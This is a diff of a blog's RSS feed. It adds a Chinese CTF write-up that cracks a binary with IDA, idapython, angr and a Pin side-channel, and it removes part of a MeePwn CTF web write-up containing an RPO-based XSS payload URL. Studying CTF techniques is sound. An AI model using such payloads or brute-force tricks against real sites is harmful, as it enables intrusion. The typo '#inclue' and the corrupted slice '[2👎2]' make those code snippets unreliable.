@@ -682,6 +682,328 @@ In Proceedings of the 25th ACM Conference on Computer and Communications Securit
     </item>
     
     <item>
+      <title>用工具高效（摸鱼）地解逆向题</title>
+      <link>https://syang-ng.github.io/2019/08/reverse-tools-learning/</link>
+      <pubDate>Fri, 16 Aug 2019 18:54:42 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/08/reverse-tools-learning/</guid>
+      <description>
+
+&lt;p&gt;一般来说，解一道逆向题，通常考虑使用 ida / ghidra 进行静态逆向分析或者是使用 gdb / x64dbg 来动态调试。有时程序的逻辑会非常繁琐，解题的过程也非常枯燥，这就让人不由得思考一个问题：有没有方法来高效地解题（摸鱼）呢？&lt;/p&gt;
+
+&lt;p&gt;恰好最近看到一道 p4 出的一道很有意思的逆向题目，虽然难度不大，但由于题目条件设置的原因，人工求解会变得非常繁琐，相对应地，利用工具就能方便地进行求解。正好可以借此机会，来尝试使用工具高效地对逆向题进行求解。&lt;/p&gt;
+
+&lt;h2 id=&#34;题目分析&#34;&gt;题目分析&lt;/h2&gt;
+
+&lt;p&gt; 用 file 命令检查文件，可以看到是一个 64 位的程序：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ file elementary
+elementary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d5989f8d294badf15acaa157984968eea75f1fce, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;用 ida64 打开，反编译 main 方法，可以看到程序的逻辑非常简单，根据 &lt;code&gt;checkFlag&lt;/code&gt; 函数的返回结果，程序输出 &lt;code&gt;Good job!&lt;/code&gt; 或者是 &lt;code&gt;Wrong!&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/main.png&#34; alt=&#34;主函数&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续跟进 &lt;code&gt;checkFlag&lt;/code&gt;  函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/checkFlag.png&#34; alt=&#34;checkFlag&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到这个方法很长，但其实逻辑还是较为简单的，输入共 104 个字节、 832 个 bit，然后针对其中的一个 bit，会调用 &lt;code&gt;function0&lt;/code&gt; 到 &lt;code&gt;function831&lt;/code&gt; 共 832 个函数中的一个。观察 &lt;code&gt;function0&lt;/code&gt; 到 &lt;code&gt;function831&lt;/code&gt; 函数的具体反汇编结果，可以看到，虽然总共有 832 个函数，但实际上函数具体的反汇编结果无非两种，一是直接返回该 bit，二是返回该 bit 的取反值。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/function.png&#34; alt=&#34;function&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由此，函数的检查逻辑非常清晰，其实就是 832 个函数分别对 832 个输入的 bit 做校验，验证全部通过的输入即为 flag。那么，开始手动求解，832个函数很快的（不是）。我们下面来考虑如何利用工具对本题进行求解：&lt;/p&gt;
+
+&lt;h2 id=&#34;ida&#34;&gt;ida&lt;/h2&gt;
+
+&lt;p&gt;作为一款强大的二进制分析工具，ida 提供了相当之多的功能，比如说 &lt;code&gt;File&lt;/code&gt;-&amp;gt;&lt;code&gt;Produce file&lt;/code&gt;  可以导出程序相关的文件，包括反汇编的 C 代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/produce.png&#34; alt=&#34;produce&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看到这里，最直接的一个思路就是通过对 ida 生成的 C 代码进行修改，将对 bit 的验证修改为对 bit 的赋值，在执行完 832 次赋值后就会得到最终的 flag。&lt;/p&gt;
+
+&lt;p&gt;观察其中一条判断语句，可以发现它要求对应的函数 &lt;code&gt;function572&lt;/code&gt; 针对输入返回 0：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if ( (unsigned int)function572((a1[85] &amp;gt;&amp;gt; 2) &amp;amp; 1) )
+    return 0LL;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以只需要判断在输入为 1 的情况下，该函数的返回是否为 0，如果为 0，说明该 bit 的值应该是 1，反之则为 0：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if(function572(1) == 0)
+    a1[85] |= (1&amp;lt;&amp;lt;2);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以利用 python 编写脚本，完成全部判断语句到赋值语句到转换：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def trans_func(l):
+    sp = l.index(&#39;function&#39;)
+    ep = l.index(&#39;(&#39;, sp)
+    func = l[sp:ep]
+    if &#39;[&#39; not in l:
+        index = 0
+    else:
+        sp = l.index(&#39;[&#39;)
+        ep = l.index(&#39;]&#39;, sp)
+        index = int(l[sp+1:ep])
+    if &amp;quot;&amp;gt;&amp;gt;&amp;quot; not in l:
+        offset = 0
+    else:
+        sp = l.index(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
+        ep = l.index(&amp;quot;)&amp;quot;, sp)
+        offset = int(l[sp+3:ep])
+    return &amp;quot;if({}(1) == 0)\n    a1[{}] |= (1&amp;lt;&amp;lt;{});&amp;quot;.format(func, index, offset)
+
+# sample
+trans_func(&#39;if ( (unsigned int)function572((a1[85] &amp;gt;&amp;gt; 2) &amp;amp; 1) )&#39;)
+# &#39;if(function572(1) == 0)\n    a1[85] |= (1&amp;lt;&amp;lt;2);&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过对 ida 导出的 c 源码进行修改，最终生成 &lt;code&gt;solve.c&lt;/code&gt; 文件如下，编译运行，即可得到 flag：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#inclue &amp;lt;string.h&amp;gt;
+
+int main(int argc, const char **argv, const char **envp);
+int function0(int a1);
+int function1(int a1);
+...
+int function830(int a1);
+int function831(int a1);
+int checkFlag(char *a1);
+
+int main(int argc, const char **argv, const char **envp) {
+  char v4[104];
+  memset(v4, 0, 104);
+  if (checkFlag(v4))
+    printf(&amp;quot;%s\n&amp;quot;, v4);
+  return 0;
+}
+
+int function0(int a1) {
+  return a1 ^ 1u;
+}
+...
+int function831(int a1) {
+  return a1 ^ 1u;
+}
+
+int checkFlag(char *a1) {
+    if(function0(1) == 0)
+        a1[64] |= (1&amp;lt;&amp;lt;0);
+    ...
+    if(function831(1) == 0)
+        a1[20] |= (1&amp;lt;&amp;lt;4);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ gcc solve.c
+$ ./a.out
+p4{I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;idapython&#34;&gt;idapython&lt;/h2&gt;
+
+&lt;p&gt;既然能通过 ida 导出的 c 文件和 python 相结合的方式解题，那么能否使用 idapython 直接完成本题呢？答案是肯定的，需要利用 idapython 提供的三个函数：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Functions&lt;/code&gt; ：遍历所有的函数（返回的是函数的入口地址）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;get_func_name&lt;/code&gt;：根据地址返回函数名&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;decompile&lt;/code&gt;：反编译函数&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;具体的操作和之前的解法在思路上较为相似，首先遍历所有的函数（&lt;code&gt;function0&lt;/code&gt; - &lt;code&gt;function831&lt;/code&gt;），对函数进行解析（判断是否取反）；然后反编译 &lt;code&gt;checkFlag&lt;/code&gt; 函数，通过解析对各个函数的调用顺序，对 flag 变量进行赋值。&lt;/p&gt;
+
+&lt;p&gt;相应代码如下（用正则匹配函数和相应的返回）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import re
+from idaapi import decompile
+from idautils import Functions
+
+funcs = {}
+flag = [0 for i in range(104)]
+
+for x in Functions():
+    fn = get_func_name(x)
+    if fn.find(&#39;function&#39;) != -1:
+        v = int(str(decompile(x)).find(&#39;^&#39;)!=-1)
+        funcs[fn] = v
+                
+checkFlag_addr = 0xceb7c
+codes = str(decompile(checkFlag_addr)).split(&#39;\n&#39;)[2👎2]
+
+for code in codes:
+    fn = re.search(&#39;function[0-9]+&#39;, code)
+    fn = fn.group(0)
+    idx = re.search(&#39;a1\[([0-9]+)&#39;, code)
+    idx = 0 if not idx else int(idx.group(1))
+    bit = re.search(&#39;&amp;gt;&amp;gt; ([0-9]+)&#39;, code)
+    bit = 0 if not bit else int(bit.group(1))
+
+    flag[idx] += funcs[fn] &amp;lt;&amp;lt; bit
+
+print(&#39;&#39;.join(map(chr, flag)))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;直接在 ida 内部的 python 终端下运行，运行结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/idapython.png&#34; alt=&#34;IDA python&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;angr&#34;&gt;angr&lt;/h2&gt;
+
+&lt;p&gt;作为大名鼎鼎的符号执行工具，angr 也是解逆向题的神兵利器。有些时候甚至题目还没逆完说不定就用 angr 跑出结果了，用 angr 解题实乃摸鱼的不二法宝。&lt;/p&gt;
+
+&lt;p&gt;使用 angr 求解通常需要以下两个步骤：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;确认 flag 的长度，建立约束条件&lt;/li&gt;
+&lt;li&gt;明确需要执行到的分支和不想执行到的分支&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;对本题来说，很明显 flag 长度为 832 个 bit，因为共有 832 个函数；然后希望执行到的分支地址为 &lt;code&gt;0x773&lt;/code&gt;，输出 &lt;code&gt;Good job!&lt;/code&gt;，不想执行到的分支地址为 &lt;code&gt;0x786&lt;/code&gt;，最终会输出 &lt;code&gt;Wrong!&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;另外，在 &lt;code&gt;checkFlag&lt;/code&gt;  函数中，同样存在着大量我们不想执行的分支，比如会执行 &lt;code&gt;return 0&lt;/code&gt; 的任意一个分支，相应的汇编代码如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/avoid.png&#34; alt=&#34;branch&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;为了加快求解速度，我们需要获得所有 &lt;code&gt;mov eax,0&lt;/code&gt; 相关指令的地址，这些都不属于我们想要执行的分支。使用 linux 命令提取如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 反编译，过滤得到相应指令
+$ objdump -d elementary | grep &amp;quot;\$0x0,%eax&amp;quot; &amp;gt; asm.txt
+# 提取地址
+$ awk &#39;{ print $1 }&#39; asm.txt | cut -d&#39;:&#39; -f1 &amp;gt; avoid_addr
+# 过滤前几个无用地址
+$ tail -n +6 avoid_addr &amp;gt; avoid_addr
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;提取了相应地址后，即可编写相应解题脚本，脚本参考：&lt;a href=&#34;https://gist.github.com/0xcpu/bad0b86f2a52b65ce4af06008d58a4c7&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://gist.github.com/0xcpu/bad0b86f2a52b65ce4af06008d58a4c7&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import angr
+import claripy
+
+# angr 使用 0x400000 作为基地址，所以需要加上相应偏移
+start = 0x40071a
+find = 0x400773
+avoid = [0x400786]
+
+flag_length = 104
+# 不希望执行的分支
+with open(&#39;./avoid_addr&#39;) as f:
+    lines = f.readlines()
+    lines = [line.strip() for line in lines]
+    for line in lines:
+        avoid.append(0x400000 + int(line, 16))
+
+def main():
+    # 初始化项目
+    p = angr.Project(&#39;./elementary&#39;)
+    # 设置 flag
+    flag = claripy.BVS(&#39;flag&#39;, flag_length * 8)
+    state = p.factory.blank_state(addr=start, stdin=flag, add_options={angr.options.LAZY_SOLVES})
+    # 输入字符的约束条件，必须是可打印字符
+    for c in flag.chop(8):
+        state.solver.add(state.solver.And(c &amp;lt;= &#39;~&#39;, c &amp;gt;= &#39; &#39;))
+
+    ex = p.factory.simulation_manager(state)
+    ex.use_technique(angr.exploration_techniques.Explorer(find=find, avoid=avoid))
+    # 运行 
+    ex.run()
+    # 输出结果
+    print(ex.found[0].posix.dumps(0).decode(&#39;utf-8&#39;))
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到只用了 64 秒就可以跑出 flag，还是非常高效的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/angr.png&#34; alt=&#34;solve by angr&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;pin-tool&#34;&gt;PIN tool&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;PIN tool&lt;/code&gt; 是 intel 开发的一款二进制程序的插桩分析工具，允许研究人员用不同的 pintool 在二进制程序层面分析程序的执行情况。利用 PIN tool 对程序进行插桩，而后通过侧信道的方式，能直接得到很多题目的答案。&lt;/p&gt;
+
+&lt;p&gt;既然考虑到利用 PIN tool 需要侧信道，首先需要思考的问题是，利用什么信息可以推断我们的输入正确。&lt;/p&gt;
+
+&lt;p&gt;直接使用统计执行指令数的 pintool - inscount1.so，可以发现在不同的输入下，程序实际执行的指令数不同。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ ../../../pin -t obj-intel64/inscount1.so  -- /home/syang/CTF/elementary &amp;lt;&amp;lt;&amp;lt; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~8~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Password: Wrong!
+$ cat inscount.out
+Count 150764
+$ ../../../pin -t obj-intel64/inscount1.so  -- /home/syang/CTF/elementary &amp;lt;&amp;lt;&amp;lt; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~e~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Password: Wrong!
+$ cat inscount.out
+Count 153422
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么如何验证该输入是正确还是错误呢？回到 &lt;code&gt;checkFlag&lt;/code&gt; 看其逻辑，可以发现只有 &lt;code&gt;function2&lt;/code&gt;  函数返回 0 的情况下，程序才会继续往下执行，反之 &lt;code&gt;checkFlag&lt;/code&gt; 函数会直接返回。因此，有了以下推论：输入正确 =&amp;gt; 程序继续执行 =&amp;gt; 执行的指令数更多；输入错误 =&amp;gt; 程序提前返回 =&amp;gt; 执行的指令数更少。所以可以通过判断不同输入下执行的指令数目多少，来判断我们的输入是否正确。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if ( (unsigned int)function2((a1[64] &amp;gt;&amp;gt; 5) &amp;amp; 1) )
+    return 0LL;
+if ( (unsigned int)function3((a1[64] &amp;gt;&amp;gt; 4) &amp;amp; 1) )
+    return 0LL;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;编写利用 pintool 进行侧信道的 python 脚本（需要提取每次爆破的字节顺序）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from subprocess import Popen, PIPE
+import string
+
+s = string.ascii_letters + string.digits + &amp;quot;+-_{}&amp;quot;
+
+flag = [&amp;quot;?&amp;quot; for i in range(104)]
+
+indexes = [64, 38, 67, 88, 21, 68, 95, 36, 39, 77, 101, 90, 6, 48, 23, 62, 81, 83, 79, 44, 25, 17, 52, 3, 29, 102, 28, 93, 16, 43, 78, 9, 60, 70, 71, 65, 40, 12, 56, 13, 57, 37, 69, 7, 84, 58, 89, 91, 14, 82, 45, 76, 66, 98, 75, 47, 97, 34, 80, 103, 86, 5, 74, 1, 18, 51, 72, 26, 8, 31, 42, 85, 49, 33, 54, 63, 46, 4, 41, 24, 73, 35, 30, 92, 11, 87, 50, 53, 32, 99, 96, 19, 10, 15, 55, 100, 2, 59, 94, 61, 22, 0, 27, 20]
+
+def use_pintool(test_flag):
+    pin_path = &amp;quot;/home/syang/tools/pin/pin&amp;quot;
+    pintool_path = &amp;quot;/home/syang/tools/pin/source/tools/ManualExamples/obj-intel64/inscount1.so&amp;quot;
+    binary_path = &amp;quot;/home/syang/CTF/elementary&amp;quot;
+    p = Popen([pin_path, &#39;-t&#39;, pintool_path, &#39;--&#39;, binary_path], stdin = PIPE, stdout = PIPE)
+    p.stdin.write(bytes(test_flag, encoding=&#39;utf-8&#39;))
+    p.communicate()
+    with open(&#39;./inscount.out&#39;) as f:
+        data = f.read()
+        return int(data[len(&#39;Count &#39;):])
+
+for i in indexes:
+    test = flag[::]
+    base_count = use_pintool(&#39;&#39;.join(test))
+    c = &#39;?&#39;
+    for j in s:
+        test[i] = j
+        test_count = use_pintool(&#39;&#39;.join(test))
+        # 执行的指令数目最多的输入，才是正确的输入
+        if base_count  &amp;lt; test_count:
+            c = j
+            base_count = test_count
+
+    flag[i] = c
+    print(&#39;&#39;.join(flag))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;针对本题的条件，理论上 1bit 1bit 的爆破效率更高，但为了方便脚本的编写，我们对一个字节进行整体爆破，所以脚本运行需要更长的一段时间，最后结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-Tools-Learning/pintool.png&#34; alt=&#34;pintool crack&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;用工具解题，跑不出来不亏，跑得出来血赚&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctf-wiki.github.io/ctf-tools/binary_core_tools/instrumentation/intel_pin/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;CTF Tools - intel pin&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://firmianay.gitbooks.io/ctf-all-in-one/doc/5.2.1_pin.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;CTF All in One - 5.2.1 Pin 动态二进制插桩&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://gist.github.com/0xcpu/bad0b86f2a52b65ce4af06008d58a4c7&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Elementary Writeup by One Man Orchestra&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/13923&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Elementary Writeup by System87&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
       <title>Ethernaut 部分题解</title>
       <link>https://syang-ng.github.io/2019/05/ethernaut-part-writeup/</link>
       <pubDate>Mon, 27 May 2019 13:42:59 +0000</pubDate>
@@ -3839,496 +4161,6 @@ function save_command($email,$salt,$data){
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/10418&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Mapl Story by RedRocket&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>MeePwn CTF 2018 Web</title>
-      <link>https://syang-ng.github.io/2018/07/meepwnctf-2018-web/</link>
-      <pubDate>Tue, 17 Jul 2018 18:04:35 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/07/meepwnctf-2018-web/</guid>
-      <description>
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;上周末打了 MeePwnCTF 2018，感觉还是非常有价值的一场比赛&lt;/p&gt;
-
-&lt;h2 id=&#34;grandline&#34;&gt;Grandline&lt;/h2&gt;
-
-&lt;p&gt;本题的考点是 RPO 攻击问题，关于 RPO 攻击的具体细节，可以自行 Google，这里不再做过多叙述&lt;/p&gt;
-
-&lt;p&gt;访问 &lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;!-- 
-/* * *  Power By 0xd0ff9 * * * 
---&amp;gt; 
-&amp;lt;?php 
-include &amp;quot;config.php&amp;quot;; 
-if(isset($_GET[&#39;debug&#39;])) 
-{ 
-    show_source(__FILE__); 
-    die(&amp;quot;...&amp;quot;); 
-} 
-?&amp;gt; 
-&amp;lt;!DOCTYPE html&amp;gt; 
-&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; 
-&amp;lt;head&amp;gt; 
-  &amp;lt;title&amp;gt;The Two piece Treasure&amp;lt;/title&amp;gt; 
-  &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt; 
-  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt; 
-  &amp;lt;!-- Latest compiled and minified CSS --&amp;gt; 
-  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/bootstrap.min.css&amp;quot;&amp;gt; 
-  &amp;lt;!-- jQuery library --&amp;gt; 
-  &amp;lt;script src=&amp;quot;js/jquery.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
-  &amp;lt;!-- Latest compiled JavaScript --&amp;gt; 
-  &amp;lt;script src=&amp;quot;js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
-&amp;lt;/head&amp;gt; 
-&amp;lt;body&amp;gt; 
-&amp;lt;?php 
-$grandline = $_SERVER[&#39;REQUEST_URI&#39;]; 
-// Best Grandline is short 
-$grandline = substr($grandline,0,500); 
-echo &amp;quot;&amp;lt;!-- P/s: Your grand line is &amp;quot;.htmlentities(urldecode($grandline),ENT_QUOTES).&amp;quot; , this is not Luffy &#39;s grand line --&amp;gt;&amp;quot;; 
-?&amp;gt; 
-&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt; 
-&amp;lt;div class=&amp;quot;jumbotron&amp;quot;&amp;gt; 
-    &amp;lt;h1&amp;gt;GRAND LINE&amp;lt;/h1&amp;gt;  
-    &amp;lt;p&amp;gt;Welcome to Grand Line, You are in the way to become Pirate King, now, let&#39;s defeat &amp;lt;a href=&amp;quot;bot.php&amp;quot;&amp;gt;BigMom&amp;lt;/a&amp;gt; first&amp;lt;/p&amp;gt;  
-&amp;lt;/div&amp;gt; 
-&amp;lt;?php 
-$loca = $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]; 
-echo &amp;quot;&amp;lt;input name=&#39;location&#39; value=&#39;&amp;quot;.$loca.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;quot;; 
-if ($loca === &amp;quot;127.0.0.1&amp;quot; || $loca===&amp;quot;::1&amp;quot;) 
-{ 
-    echo &amp;quot;&amp;lt;input name=&#39;piece&#39; value=&#39;&amp;quot;.$secret.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&amp;quot;; 
-} 
-else 
-{ 
-    echo &amp;quot;&amp;lt;input name=&#39;piece&#39; value=&#39;Only whitebeard can see it, Gura gura gura&#39; type=&#39;hidden&#39;&amp;gt;&amp;quot;; 
-} 
-?&amp;gt; 
-  &amp;lt;h4&amp;gt;If you eat fruit, you can&#39;t swim&amp;lt;/h4&amp;gt; 
-        &amp;lt;img src=&amp;quot;images/grandline.png&amp;quot;/&amp;gt; 
-        &amp;lt;br&amp;gt; 
-        &amp;lt;form method=&amp;quot;get&amp;quot; action=&amp;quot;index.php&amp;quot;&amp;gt; 
-        &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;eat&amp;quot; placeholder=&amp;quot;&amp;quot; value=&amp;quot;gomu gomu no mi&amp;quot;&amp;gt;         
-        &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; 
-        &amp;lt;/form&amp;gt; 
-    &amp;lt;?php  
-    if(isset($_GET[&#39;eat&#39;])&amp;amp;&amp;amp;!empty($_GET[&#39;eat&#39;])) 
-    { 
-        if($_GET[&#39;eat&#39;] === &amp;quot;gomu gomu no mi&amp;quot;) 
-        { 
-            echo &amp;quot;&amp;lt;p&amp;gt;Pirate, Let&#39;s go to your Grand Line&amp;lt;/p&amp;gt;&amp;quot;; 
-        } 
-        else 
-        { 
-            echo &amp;quot;&amp;lt;p&amp;gt;You need to eat &#39;gomu gomu no mi&#39;&amp;lt;/p&amp;gt;&amp;quot;; 
-        } 
-    } 
-     
-    ?&amp;gt; 
-&amp;lt;/div&amp;gt; 
-&amp;lt;/body&amp;gt; 
-&amp;lt;/html&amp;gt; 
-&amp;lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&amp;lt;&amp;gt;+-*/ ) 
-...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到由于 &lt;code&gt;htmlentities(urldecode($grandline),ENT_QUOTES)&lt;/code&gt; 的存在，使得我们直接闭合 HTML 标签的思路失败，那么这里是否存在其他可以利用的点呢？答案是肯定的，这里需要使用 RPO 攻击的方法&lt;/p&gt;
-
-&lt;p&gt;当我们访问 &lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/&lt;/a&gt; 时，浏览器继续返回 index.php 的内容：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline1.png&#34; alt=&#34;Grandline1&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;但我们需要注意的是，浏览器和服务器对于路径解析的差异，而这也是 RPO 攻击的核心所在：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline2.png&#34; alt=&#34;Grandline2&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js&lt;/a&gt; 的结果如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline3.png&#34; alt=&#34;Grandline3&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;同样是 index.php 的内容！&lt;/p&gt;
-
-&lt;p&gt;这意味着这里存在着我们可以控制内容的 js 文件：jquery.min.js 和 bootstrap.min.js&lt;/p&gt;
-
-&lt;p&gt;下面需要思考的是如何通过控制 url 的方式使得 XSS 攻击生效&lt;/p&gt;
-
-&lt;p&gt;可以看到在开通和结尾，出题人故意留了两个相应的标记 &lt;code&gt;/*&lt;/code&gt; 和 &lt;code&gt;*/&lt;/code&gt;：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 
-/* * *  Power By 0xd0ff9 * * * 
---&amp;gt; 
-...
-&amp;lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&amp;lt;&amp;gt;+-*/ )
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此时我们可以通过手动闭合 js 注释标签的方式，构造 payload，在内部插入一段恶意的 js 代码即可&lt;/p&gt;
-
-&lt;p&gt;构造如下 payload，使得浏览器能够弹窗：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/&lt;/a&gt;&lt;/p&gt;
-
